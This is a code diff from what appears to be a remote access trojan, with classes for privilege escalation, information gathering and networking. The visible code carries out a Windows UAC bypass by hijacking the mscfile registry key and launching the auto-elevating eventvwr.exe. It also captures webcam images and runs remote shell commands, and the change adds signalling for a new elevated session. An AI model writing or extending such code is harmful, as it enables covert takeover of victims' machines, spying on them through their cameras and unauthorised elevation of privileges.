@@ -485,9 +485,11 @@ class Privilege_Escalation:
 			
 		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
 		execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"')
+		shell.transport.signal_channel.signal("NEW_SESH")
 		os.startfile("eventvwr.exe") # Eventvwr is a program that autoelevates and also runs a program specified in a certain registry key.
 		time.sleep(2)
 		execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f")
+		
 		return "BG_NEW_SESH"
 		
 	@windows_only
@@ -590,7 +592,6 @@ class Information_Gathering:
 		time.sleep(2) # So camera has time to adjust focus, brightness, etc.
 		
 		buffer, width, height = cam.getbuffer()
-		
 		return base64.b64encode(buffer)+"|"+str(width)+"|"+str(height)+"|"
 		
 class Networking:
@@ -773,7 +774,7 @@ help - This menu!
 			else:
 				output = execute.execute_shell_command(data)[1]
 				
-			self.send(str(output)+"\n"+os.getcwd()+">>")
+			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
 		
 	def send(self, data):
 		self.channel.write_output(data)
